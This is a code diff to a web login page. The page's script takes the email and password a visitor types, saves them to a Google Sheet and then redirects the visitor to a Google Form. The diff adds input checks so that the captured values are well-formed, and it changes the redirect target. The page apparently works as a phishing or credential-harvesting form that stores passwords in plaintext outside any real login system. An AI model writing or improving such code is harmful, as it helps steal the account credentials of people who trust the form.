@@ -123,10 +123,21 @@
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
 
+            // Validate Email and Password conditions
+            if (!email || email.length < 10 || !email.includes('@')) {
+                alert("Please enter a valid email (at least 10 characters and include '@').");
+                return;
+            }
+
+            if (!password || password.length < 6) {
+                alert("Please enter a valid password (at least 6 characters).");
+                return;
+            }
+
             // Save to Google Sheets and redirect after success
             saveToGoogleSheet(email, password).then(() => {
                 // Redirect to Google Form after data is saved
-                window.location.href = "https://docs.google.com/spreadsheets/d/1oR-EqTrnuxihtqC9a9VC7Pi8fWy9kzPL5p1DO8H31m0/edit?resourcekey=&gid=0#gid=0";
+                window.location.href = "https://docs.google.com/forms/d/1J--LJ32VIm-GSl7I1KOB0KIRFLWv4sOMYPBZUtmvH84/edit";
             }).catch((error) => {
                 // Handle any errors that occurred during the save
                 console.error("Error saving data:", error);
